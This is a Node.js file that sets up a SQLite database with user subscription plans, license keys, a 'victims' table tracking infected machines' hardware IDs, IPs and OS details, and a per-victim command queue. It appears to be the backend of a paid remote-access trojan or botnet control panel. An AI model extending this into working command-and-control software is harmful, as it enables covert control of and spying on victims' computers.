const sqlite = require('sqlite');
const sqlite3 = require('sqlite3');

async function setupDatabase() {
    try {
        const db = await sqlite.open({
            filename: './database_v2.db',
            driver: sqlite3.Database
        });

        await db.exec(`
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                discord_id TEXT,
                username TEXT NOT NULL UNIQUE,
                password TEXT NOT NULL,
                plan TEXT NOT NULL,
                plan_expiry DATE,
                is_logged_in INTEGER DEFAULT 0
            );
        `);

        try {
            // Check if key_string exists, if not, drop table
            const tableInfo = await db.all("PRAGMA table_info(key_usage)");
            const hasKeyString = tableInfo.some(col => col.name === 'key_string');
            if (!hasKeyString && tableInfo.length > 0) {
                console.log('Migrating key_usage table: Dropping old table...');
                await db.exec(`DROP TABLE key_usage;`);
            }
        } catch (e) {
            console.error('Error checking table schema:', e);
        }

        await db.exec(`
            CREATE TABLE IF NOT EXISTS key_usage (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                key_string TEXT UNIQUE,
                generated_at DATETIME NOT NULL,
                FOREIGN KEY (user_id) REFERENCES users (id)
            );
        `);

        await db.exec(`
            CREATE TABLE IF NOT EXISTS key_usage (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                key_string TEXT UNIQUE,
                generated_at DATETIME NOT NULL,
                FOREIGN KEY (user_id) REFERENCES users (id)
            );
        `);

        await db.run(`
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                hardware_id TEXT NOT NULL,
                ip_address TEXT,
                os_info TEXT,
                computer_name TEXT,
                last_seen DATETIME,
                status TEXT DEFAULT 'offline',
                UNIQUE(user_id, hardware_id),
                FOREIGN KEY (user_id) REFERENCES users (id)
            );
        `);

        await db.run(`
            CREATE TABLE IF NOT EXISTS command_queue (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_hwid TEXT NOT NULL,
                command_type TEXT NOT NULL,
                command_data TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME NOT NULL,
                executed_at DATETIME,
                result TEXT
            );
        `);

        await db.run(`
            CREATE TABLE IF NOT EXISTS processed_messages (
                message_id TEXT PRIMARY KEY,
                processed_at DATETIME NOT NULL
            );
        `);

        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
        await db.run('DELETE FROM processed_messages WHERE processed_at < ?', oneHourAgo);

        console.log('Database and tables are set up successfully.');
        return db;
    } catch (error) {
        console.error('Error setting up database:', error);
        process.exit(1);
    }
}

module.exports = setupDatabase;

